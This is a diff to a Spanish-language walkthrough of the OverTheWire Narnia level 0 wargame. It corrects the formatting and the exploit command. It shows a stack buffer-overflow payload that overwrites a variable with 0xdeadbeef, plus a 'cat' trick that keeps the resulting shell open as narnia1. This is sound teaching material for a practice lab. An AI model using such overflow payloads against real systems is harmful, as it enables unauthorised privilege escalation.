@@ -65,13 +65,17 @@ Para convertir un valor a little endian (en este caso queremos convertir `0xdead
 ```
 narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
-```                                               val: 0xdeadbeef
-Entonces, el desafío falla y no abre un shell, pero nos muestra que el valor correcto está en su lugar, ahora podemos usar un pequeño truco que involucra a `cat` para mantener abierto el flujo de E/S:
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
+                                               val: 0xdeadbeef
 ```
-narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
+
+Entonces, el desafío falla y no abre un shell, pero nos muestra que el valor correcto está en su lugar, ahora podemos usar un pequeño truco que involucra a `cat` para mantener abierto el flujo de E/S:
+
+```
+narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
-$whoami
+                                               val: 0xdeadbeef
+whoami
 narnia1
 ```
